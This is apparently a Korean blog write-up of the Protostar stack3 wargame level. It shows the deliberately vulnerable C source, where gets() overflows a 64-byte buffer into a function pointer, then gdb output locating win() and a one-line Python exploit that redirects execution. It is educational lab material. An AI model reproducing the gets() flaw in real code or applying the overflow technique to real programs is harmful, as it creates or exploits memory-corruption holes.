---
layout: post
title: "[exploit-exercise] Protostar stack3"
date: 2016-07-02 21:03:10
category: wargame
tags:  [exploit-exercise, protostar]
---

[Protostar Stack3 - Exploit Exercises](https://exploit-exercises.com/protostar/stack3/)

>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
>
>Hints
>
>both gdb and objdump is your friend you determining where the win() function lies in memory.
>This level is at /opt/protostar/bin/stack3

<!--more--> 

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

#### 해결 방안

function pointer `fp` 로 jump 을 할 것이고,  `win()` 함수가 정의 되어 있으므로 BoF 로 `buffer[64]` 를 덮고, 그 뒤에 있는 `fp` 값을 `win()` 주소가 되도록 덮으면 된다.

```
(gdb) disas win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   %ebp
0x08048425 <win+1>:     mov    %esp,%ebp
0x08048427 <win+3>:     sub    $0x18,%esp
0x0804842a <win+6>:     movl   $0x8048540,(%esp)
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret   
```

#### Exploit

```bash
$ python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed  
```

